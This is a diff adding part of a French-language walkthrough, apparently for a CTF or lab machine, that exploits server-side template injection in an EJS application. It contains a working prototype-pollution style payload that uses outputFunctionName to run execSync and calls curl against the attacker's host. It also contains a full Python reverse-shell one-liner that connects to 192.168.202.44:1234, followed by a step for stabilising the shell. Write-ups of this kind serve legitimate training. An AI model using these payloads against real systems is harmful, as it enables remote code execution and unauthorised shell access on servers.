@@ -138,3 +138,33 @@ L'erreur nous permet de savoir le templates utilisé par EJS (Embedded JavaScrip
 ![image](https://github.com/user-attachments/assets/325a006a-abb1-4804-a828-b8b84af44acb)
 -->
 
+La payload suivante me permet de m'assurer que la SSTI fonctionne et que l'on peut effectuer une exécution de code à distance (RCE) :
+name=a&passord=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 192.168.202.44:8000');s
+<!--
+![image](https://github.com/user-attachments/assets/033eddbe-4e57-45e2-8ffb-b14d3382cd15)
+-->
+
+Ca fonctionne !
+<!--
+![image](https://github.com/user-attachments/assets/50af5687-c714-4ecb-973d-f3b73c27adeb)
+-->
+
+Maintenant, nous pouvons l'utiliser pour obtenir un shell, d'abord en utilisant notre serveur web pour servir une charge utile de shell inversé.
+
+On créer un fichier 'payload.py', et y mets la charge utile :
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.202.44",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+<!--
+![image](https://github.com/user-attachments/assets/72ea4b3d-4283-4718-97b2-9e9b80fcabbb)
+-->
+<!--
+![image](https://github.com/user-attachments/assets/9a31ed45-006d-4180-af08-688cc6c392ad)
+-->
+<!--
+![image](https://github.com/user-attachments/assets/e862b1c2-9371-43c6-8add-33cc70ba0e8d)
+-->
+
+On effectue une shell stabilization :
+<!--
+![image](https://github.com/user-attachments/assets/ef5be721-2c95-4cc9-89c3-b5b04de621e9)
+-->
+
